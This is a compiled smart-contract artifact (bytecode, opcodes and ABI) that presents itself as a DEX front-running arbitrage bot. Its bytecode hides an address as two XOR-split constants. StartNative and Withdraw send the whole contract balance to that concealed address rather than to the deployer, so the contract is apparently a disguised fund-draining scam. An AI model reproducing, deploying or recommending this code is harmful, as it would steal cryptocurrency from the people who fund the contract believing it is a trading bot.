{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040526658d15e176280006001556002805460ff191690557f3a57f374f7342b8cd9a2efaf714628fed758ce101e8a68d6000e5325b9bdcf9d6005557f3a57f374f7342b8cd9a2efaf6375db69e2490ac740682471adde32a75f7072aa60065534801561006c575f80fd5b505f80546001600160a01b031916331790556103d88061008b5f395ff3fe608060405260043610610092575f3560e01c8063bedf0f4a11610057578063bedf0f4a14610131578063d84308191461014c578063eaf67ab914610160578063f0fa55a914610168578063fa2d991914610187575f80fd5b806352bde6261461009d57806357ea89b6146100be5780635825a150146100d25780635c75cc83146100fa578063a1ec46f3146100fa575f80fd5b3661009957005b5f80fd5b3480156100a8575f80fd5b506100bc6100b736600461034c565b600355565b005b3480156100c9575f80fd5b506100bc6101b0565b3480156100dd575f80fd5b506100e760085481565b6040519081526020015b60405180910390f35b348015610105575f80fd5b50610119610114366004610363565b610218565b6040516001600160a01b0390911681526020016100f1565b34801561013c575f80fd5b506100bc6002805460ff19169055565b348015610157575f80fd5b506100e7610222565b6100bc610240565b348015610173575f80fd5b506100bc61018236600461034c565b610248565b348015610192575f80fd5b506007546101a09060ff1681565b60405190151581526020016100f1565b5f546001600160a01b0316331461020e5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064015b60405180910390fd5b6102166102ab565b565b8181185b92915050565b6001545f80549091829161021c91906001600160a01b031631610383565b610216610304565b60288111156102995760405162461bcd60e51b815260206004820152601a60248201527f536c6970706167652063616e6e6f7420657863656564203430250000000000006044820152606401610205565b6008556007805460ff19166001179055565b5f546001600160a01b031633146103045760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610205565b5f610313600654600554610218565b6040519091506001600160a01b038216904780156108fc02915f818181858888f19350505050158015610348573d5f803e3d5ffd5b5050565b5f6020828403121561035c575f80fd5b5035919050565b5f8060408385031215610374575f80fd5b50508035926020909101359150565b8181038181111561021c57634e487b7160e01b5f52601160045260245ffdfea2646970667358221220a2d93347f9aa77bd6e280b01c31b6fcff7ed98e85437bbee77d305975ce8bf0764736f6c63430008180033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH7 0x58D15E17628000 PUSH1 0x1 SSTORE PUSH1 0x2 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SSTORE PUSH32 0x3A57F374F7342B8CD9A2EFAF714628FED758CE101E8A68D6000E5325B9BDCF9D PUSH1 0x5 SSTORE PUSH32 0x3A57F374F7342B8CD9A2EFAF6375DB69E2490AC740682471ADDE32A75F7072AA PUSH1 0x6 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x6C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE PUSH2 0x3D8 DUP1 PUSH2 0x8B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x92 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBEDF0F4A GT PUSH2 0x57 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0xD8430819 EQ PUSH2 0x14C JUMPI DUP1 PUSH4 0xEAF67AB9 EQ PUSH2 0x160 JUMPI DUP1 PUSH4 0xF0FA55A9 EQ PUSH2 0x168 JUMPI DUP1 PUSH4 0xFA2D9919 EQ PUSH2 0x187 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x52BDE626 EQ PUSH2 0x9D JUMPI DUP1 PUSH4 0x57EA89B6 EQ PUSH2 0xBE JUMPI DUP1 PUSH4 0x5825A150 EQ PUSH2 0xD2 JUMPI DUP1 PUSH4 0x5C75CC83 EQ PUSH2 0xFA JUMPI DUP1 PUSH4 0xA1EC46F3 EQ PUSH2 0xFA JUMPI PUSH0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x99 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH2 0xB7 CALLDATASIZE PUSH1 0x4 PUSH2 0x34C JUMP JUMPDEST PUSH1 0x3 SSTORE JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC9 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH2 0x1B0 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xE7 PUSH1 0x8 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x105 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x119 PUSH2 0x114 CALLDATASIZE PUSH1 0x4 PUSH2 0x363 JUMP JUMPDEST PUSH2 0x218 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH1 0x2 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SSTORE JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x157 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xE7 PUSH2 0x222 JUMP JUMPDEST PUSH2 0xBC PUSH2 0x240 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x173 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH2 0x182 CALLDATASIZE PUSH1 0x4 PUSH2 0x34C JUMP JUMPDEST PUSH2 0x248 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x192 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x7 SLOAD PUSH2 0x1A0 SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF1 JUMP JUMPDEST PUSH0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x20E JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x216 PUSH2 0x2AB JUMP JUMPDEST JUMP JUMPDEST DUP2 DUP2 XOR JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH0 DUP1 SLOAD SWAP1 SWAP2 DUP3 SWAP2 PUSH2 0x21C SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE PUSH2 0x383 JUMP JUMPDEST PUSH2 0x216 PUSH2 0x304 JUMP JUMPDEST PUSH1 0x28 DUP2 GT ISZERO PUSH2 0x299 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x536C6970706167652063616E6E6F742065786365656420343025000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x205 JUMP JUMPDEST PUSH1 0x8 SSTORE PUSH1 0x7 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE JUMP JUMPDEST PUSH0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x304 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x205 JUMP JUMPDEST PUSH0 PUSH2 0x313 PUSH1 0x6 SLOAD PUSH1 0x5 SLOAD PUSH2 0x218 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x348 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x35C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x374 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP POP DUP1 CALLDATALOAD SWAP3 PUSH1 0x20 SWAP1 SWAP2 ADD CALLDATALOAD SWAP2 POP JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x21C JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG2 0xD9 CALLER SELFBALANCE 0xF9 0xAA PUSH24 0xBD6E280B01C31B6FCFF7ED98E85437BBEE77D305975CE8BF SMOD PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "196800",
				"executionCost": "115006",
				"totalCost": "311806"
			},
			"external": {
				"APIKey()": "infinite",
				"StartNative()": "infinite",
				"Stop()": "24349",
				"TokenPair(uint256)": "22311",
				"Withdraw()": "infinite",
				"getDexRouter(bytes32,bytes32)": "429",
				"getDexRouter1(bytes32,bytes32)": "407",
				"isSlippageSet()": "2397",
				"setSlippage(uint256)": "46638",
				"slippagePercent()": "2328"
			},
			"internal": {
				"estimateTriDexTrade(address,address,address,address,address,address,uint256)": "infinite",
				"frontRun(address,address,address,address,uint256)": "infinite",
				"getAmountOutMin(address,address,address,uint256)": "infinite",
				"getBalance(address)": "infinite",
				"mempool(address,address,address,address,uint256)": "infinite",
				"recoverEth()": "infinite",
				"recoverTokens(address)": "infinite",
				"startArbitrageNative()": "infinite",
				"swap(address,address,address,uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"APIKey()": "d8430819",
			"StartNative()": "eaf67ab9",
			"Stop()": "bedf0f4a",
			"TokenPair(uint256)": "52bde626",
			"Withdraw()": "57ea89b6",
			"getDexRouter(bytes32,bytes32)": "a1ec46f3",
			"getDexRouter1(bytes32,bytes32)": "5c75cc83",
			"isSlippageSet()": "fa2d9919",
			"setSlippage(uint256)": "f0fa55a9",
			"slippagePercent()": "5825a150"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "APIKey",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "StartNative",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Stop",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "_tokenPair",
					"type": "uint256"
				}
			],
			"name": "TokenPair",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Withdraw",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "_DexRouterAddress",
					"type": "bytes32"
				},
				{
					"internalType": "bytes32",
					"name": "_factory",
					"type": "bytes32"
				}
			],
			"name": "getDexRouter",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "pure",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "_DexRouterAddress",
					"type": "bytes32"
				},
				{
					"internalType": "bytes32",
					"name": "_factory",
					"type": "bytes32"
				}
			],
			"name": "getDexRouter1",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "pure",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "isSlippageSet",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "_slippagePercent",
					"type": "uint256"
				}
			],
			"name": "setSlippage",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "slippagePercent",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}